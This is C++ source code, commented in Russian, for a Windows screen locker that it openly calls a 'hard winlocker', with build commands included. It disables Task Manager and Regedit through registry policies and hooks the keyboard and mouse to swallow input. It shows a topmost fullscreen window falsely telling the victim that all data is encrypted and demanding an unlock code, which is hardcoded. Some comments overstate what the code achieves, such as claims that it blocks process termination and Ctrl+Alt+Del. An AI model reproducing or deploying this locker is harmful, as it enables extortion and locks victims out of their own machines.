// hardlock.cpp — жесткий винлокер
// Сборка MSVC: cl hardlock.cpp /link user32.lib gdi32.lib advapi32.lib
// Сборка MinGW: g++ hardlock.cpp -o hardlock.exe -lgdi32 -luser32 -ladvapi32 -mwindows
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <string>
#include <vector>

const std::wstring SECRET = L"qwerty123"; // секретный код для выхода
std::wstring inputBuf;
HHOOK hKeyboardHook = NULL;
HHOOK hMouseHook = NULL;

// Блокировка завершения процесса
void PreventProcessTermination() {
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hToken;
    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        CloseHandle(hToken);
    }
}

// Блокировка Диспетчера задач и редактора реестра
void DisableSystemTools() {
    HKEY hKey;
    // Disable Task Manager
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    DWORD val = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
    // Disable Registry Editor
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
}

// Восстановление доступа после разблокировки
void RestoreSystemTools() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

// Хук клавиатуры
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        // Ввод символов для пароля
        if (p->vkCode >= 'A' && p->vkCode <= 'Z') {
            inputBuf += (wchar_t)p->vkCode;
        } else if (p->vkCode == VK_BACK && !inputBuf.empty()) {
            inputBuf.pop_back();
        } else if (p->vkCode == VK_RETURN) {
            if (inputBuf == SECRET) {
                RestoreSystemTools();
                PostQuitMessage(0);
            } else {
                inputBuf.clear();
            }
        }
        return 1; // Съедаем все клавиши, кроме тех, что нужны для ввода
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Хук мыши — блокирует клики и перемещение
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1; // Съедаем всё
    }
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rect;
            GetClientRect(hwnd, &rect);
            
            HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rect, bg);
            DeleteObject(bg);
            
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 0, 0));
            HFONT font = CreateFontW(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Consolas");
            SelectObject(hdc, font);
            
            int y = rect.bottom / 2 - 150;
            const wchar_t* lines[] = { L"СИСТЕМА ЗАБЛОКИРОВАНА", L"", L"Все данные зашифрованы.", L"Для разблокировки введите код:", L"", inputBuf.c_str() };
            for (auto l : lines) {
                DrawTextW(hdc, l, -1, &rect, DT_CENTER | DT_TOP);
                rect.top += 60;
            }
            DeleteObject(font);
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_CLOSE:
        case WM_DESTROY:
            return 0; // Игнорируем закрытие
        case WM_SYSKEYDOWN:
        case WM_KEYDOWN:
            InvalidateRect(hwnd, NULL, TRUE);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    // 1. Защита процесса от завершения
    PreventProcessTermination();
    
    // 2. Блокировка Диспетчера задач и RegEdit
    DisableSystemTools();

    // 3. Регистрация окна
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"HardLockerWnd";
    RegisterClassW(&wc);

    // 4. Создание окна на весь экран без рамки, поверх всех
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_LAYERED, L"HardLockerWnd", L"System Locked",
                                WS_POPUP | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN),
                                GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, SW_SHOW);
    SetForegroundWindow(hwnd);

    // 5. Установка хуков
    hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

    // 6. Блокировка Ctrl+Alt+Del (через системную политику)
    SystemParametersInfoW(SPI_SETSCREENSAVERRUNNING, TRUE, (PVOID)TRUE, 0);

    // 7. Защита от закрытия через Alt+F4
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        InvalidateRect(hwnd, NULL, TRUE);
    }

    // 8. Очистка
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
    RestoreSystemTools();
    return 0;
}
